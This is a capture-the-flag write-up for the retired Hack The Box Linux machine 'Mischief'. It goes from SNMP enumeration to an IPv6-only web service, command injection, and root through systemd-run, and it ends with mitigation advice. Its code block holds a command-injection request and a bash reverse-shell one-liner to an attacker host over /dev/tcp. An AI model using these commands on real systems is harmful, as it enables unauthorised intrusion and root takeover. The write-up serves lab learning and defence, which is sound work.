---
machine: Mischief
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, snmp, ipv6, command-injection, systemd-run]
---

# Mischief — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

SNMP reveals an IPv6 address and a web service listening only on that interface. Command injection grants `www-data`; ACLs block `su` and `systemd-run` executes as root.

## Reconnaissance

```bash
nmap -Pn -sU -p161 <IP>
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c public <IP> ipAddresses
# IPv6 access
curl -g -6 "http://[<IPv6>]/index.php?cmd=id"
# Escalation
systemd-run --unit=shell /bin/bash -c "id"
systemd-run --unit=root /bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"
```

## Enumeration

- SNMP accessible with system strings.
- Web service on an IPv6 address not visible over IPv4.
- User with restrictive ACLs and `systemd-run` available.

## Initial access

`snmpwalk` extracts processes, interfaces and the IPv6 address. Access the service over IPv6 and exploit command injection in a parameter, obtaining a shell as `www-data`.

## Privilege escalation

The account cannot use `su` because of ACLs, but `systemd-run` launches a transient unit in a more privileged context; run a shell and reach root.

## Evidence

- `snmpwalk` with the IPv6 address.
- Command injection and shell as `www-data`.
- `systemd-run` creating a unit and root shell.

## Lessons learned

- SNMP can leak addresses and services not visible elsewhere.
- IPv6 widens the surface even when IPv4 looks closed.
- ACLs on `su` do not cover other execution paths.

## Mitigation and detection

- Restrict SNMP and change default communities.
- Audit IPv6 services and apply the same filtering as IPv4.
- Limit `systemd-run` and review ACLs and exec policies.

## References

- [0xdf — Mischief](https://0xdf.gitlab.io/2019/01/05/htb-mischief.html)
- [Net-SNMP — snmpwalk](http://www.net-snmp.org/docs/man/snmpwalk.html)
- [Hack The Box — Mischief](https://app.hackthebox.com/machines/mischief)
